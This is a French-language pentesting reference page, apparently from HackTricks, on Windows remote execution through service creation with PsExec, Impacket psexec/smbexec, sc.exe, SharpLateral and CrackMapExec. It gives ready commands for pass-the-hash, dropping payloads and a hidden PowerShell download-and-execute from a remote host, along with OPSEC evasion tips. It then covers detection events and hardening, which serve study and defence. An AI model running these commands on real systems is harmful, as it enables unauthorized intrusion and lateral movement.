# PsExec/Winexec/ScExec/SMBExec

{{#include ../../banners/hacktricks-training.md}}

## Comment fonctionnent-elles

Ces techniques exploitent à distance le Windows Service Control Manager (SCM) via SMB/RPC afin d'exécuter des commandes sur un hôte cible. Le flux courant est le suivant :

1. S'authentifier auprès de la cible et accéder au partage ADMIN$ via SMB (TCP/445).
2. Copier un exécutable ou spécifier une ligne de commande LOLBAS que le service exécutera.
3. Créer un service à distance via SCM (MS-SCMR sur \PIPE\svcctl) pointant vers cette commande ou ce binaire.
4. Démarrer le service pour exécuter le payload et capturer éventuellement stdin/stdout via un named pipe.
5. Arrêter le service et nettoyer (supprimer le service ainsi que les binaires déposés).

Prérequis :
- Être Local Administrator sur la cible (SeCreateServicePrivilege) ou disposer de droits explicites de création de services sur la cible.
- SMB (445) doit être accessible et le partage ADMIN$ disponible ; Remote Service Management doit être autorisé par le pare-feu de l'hôte.
- UAC Remote Restrictions : avec les comptes locaux, le filtrage des tokens peut bloquer les administrateurs sur le réseau, sauf si le compte intégré Administrator est utilisé ou si LocalAccountTokenFilterPolicy=1.
- Kerberos vs NTLM : l'utilisation d'un nom d'hôte/FQDN active Kerberos ; une connexion par adresse IP repasse souvent sur NTLM (et peut être bloquée dans les environnements renforcés).

### ScExec/WinExec manuel via sc.exe

Ce qui suit présente une approche minimale de création de service. L'image du service peut être un EXE déposé ou un LOLBAS tel que cmd.exe ou powershell.exe.
```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```
Notes :
- Attendez-vous à une erreur de timeout lors du démarrage d’un EXE qui n’est pas un service ; l’exécution a tout de même lieu.
- Pour rester plus OPSEC-friendly, privilégiez les commandes fileless (`cmd /c`, `powershell -enc`) ou supprimez les artefacts déposés.

Trouvez des étapes plus détaillées dans : https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>

## Outils et exemples

### Sysinternals PsExec.exe

- Outil d’administration classique qui utilise SMB pour déposer PSEXESVC.exe dans ADMIN$, installe un service temporaire (nom par défaut : PSEXESVC) et relaie les entrées/sorties via des named pipes.
- Exemples d’utilisation :<sup>[[1]](#references)</sup>
```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```
- Vous pouvez lancer directement depuis Sysinternals Live via WebDAV :
```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```
OPSEC
- Laisse des événements d'installation/désinstallation de service (le nom du service est souvent PSEXESVC, sauf si -r est utilisé) et crée C:\Windows\PSEXESVC.exe pendant l'exécution.

### Impacket psexec.py (PsExec-like)

- Utilise un service intégré de type RemCom. Dépose un binaire de service temporaire (généralement avec un nom aléatoire) via ADMIN$, crée un service (souvent RemComSvc par défaut) et relaie les entrées/sorties via un named pipe.
```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```
Artefacts
- EXE temporaire dans C:\Windows\ (8 caractères aléatoires). Le nom du service est RemComSvc par défaut, sauf indication contraire.

### Impacket smbexec.py (SMBExec)

- Crée un service temporaire qui lance cmd.exe et utilise un named pipe pour les E/S. Évite généralement de déposer un payload EXE complet ; l’exécution des commandes est semi-interactive.
```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```
### SharpLateral and SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) implémente plusieurs méthodes de lateral movement, notamment l’exécution basée sur les services.
```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```
- [SharpMove](https://github.com/0xthirteen/SharpMove) inclut la modification/création de services afin d’exécuter une commande à distance.
```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```
- Vous pouvez également utiliser CrackMapExec pour exécuter des commandes via différents backends (psexec/smbexec/wmiexec) :
```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```
## OPSEC, détection et artefacts

Artefacts typiques sur l’hôte et le réseau lors de l’utilisation de techniques similaires à PsExec :
- Événements Security 4624 (Logon Type 3) et 4672 (Special Privileges) sur la cible pour le compte administrateur utilisé.
- Événements Security 5140/5145 File Share et File Share Detailed indiquant un accès à ADMIN$ ainsi que la création/l’écriture de binaires de service (par ex. PSEXESVC.exe ou un fichier .exe aléatoire de 8 caractères).
- Événement Security 7045 Service Install sur la cible : noms de services tels que PSEXESVC, RemComSvc ou personnalisés (-r / -service-name).
- Sysmon 1 (Process Create) pour services.exe ou l’image du service, 3 (Network Connect), 11 (File Create) dans C:\Windows\, 17/18 (Pipe Created/Connected) pour des pipes tels que \\.\pipe\psexesvc, \\.\pipe\remcom_* ou leurs équivalents randomisés.
- Artefact de registre pour l’EULA de Sysinternals : HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 sur l’hôte de l’opérateur (s’il n’est pas supprimé).

Idées de hunting
- Déclencher une alerte lors de l’installation de services dont l’ImagePath contient cmd.exe /c, powershell.exe ou des emplacements TEMP.
- Rechercher les créations de processus dont le ParentImage est C:\Windows\PSEXESVC.exe ou les processus enfants de services.exe s’exécutant en tant que LOCAL SYSTEM et lançant des shells.
- Signaler les named pipes se terminant par -stdin/-stdout/-stderr ou les noms de pipes connus des clones de PsExec.

## Résolution des problèmes courants
- Access is denied (5) lors de la création de services : l’utilisateur n’est pas réellement administrateur local, les restrictions UAC à distance s’appliquent aux comptes locaux ou la protection anti-tampering de l’EDR bloque le chemin du binaire de service.
- The network path was not found (53) ou impossibilité de se connecter à ADMIN$ : le firewall bloque SMB/RPC ou les partages administratifs sont désactivés.
- Kerberos échoue mais NTLM est bloqué : se connecter avec le hostname/FQDN (et non une adresse IP), vérifier les SPN appropriés ou fournir -k/-no-pass avec des tickets lors de l’utilisation d’Impacket.
- Le démarrage du service expire mais le payload a été exécuté : comportement attendu s’il ne s’agit pas d’un véritable binaire de service ; capturer la sortie dans un fichier ou utiliser smbexec pour obtenir des I/O en temps réel.

## Notes de hardening
- Windows 11 24H2 et Windows Server 2025 exigent par défaut la signature SMB pour les connexions sortantes (et entrantes sous Windows 11). Cela ne bloque pas l’utilisation légitime de PsExec avec des credentials valides, mais empêche les abus de SMB relay non signé et peut affecter les appareils qui ne prennent pas en charge la signature.<sup>[[2]](#references)</sup>
- Le nouveau blocage de NTLM par le client SMB (Windows 11 24H2/Server 2025) peut empêcher le fallback NTLM lors d’une connexion par adresse IP ou à des serveurs non Kerberos. Dans les environnements durcis, cela bloquera PsExec/SMBExec basés sur NTLM ; utiliser Kerberos (hostname/FQDN) ou configurer des exceptions si cela est légitimement nécessaire.<sup>[[2]](#references)</sup>
- Principe du moindre privilège : réduire au minimum l’appartenance au groupe des administrateurs locaux, privilégier Just-in-Time/Just-Enough Admin, appliquer LAPS et surveiller/déclencher des alertes sur les installations de services 7045.

## Voir aussi

- Exécution distante basée sur WMI (souvent davantage fileless) :

{{#ref}}
./wmiexec.md
{{#endref}}

- Exécution distante basée sur WinRM :

{{#ref}}
./winrm.md
{{#endref}}

## Références

- [1] [PsExec - Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
- [2] [SMB security hardening in Windows Server 2025 & Windows 11](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
- [3] [Using Credentials to Own Windows Boxes - Part 2 (PSExec and Services)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)

{{#include ../../banners/hacktricks-training.md}}
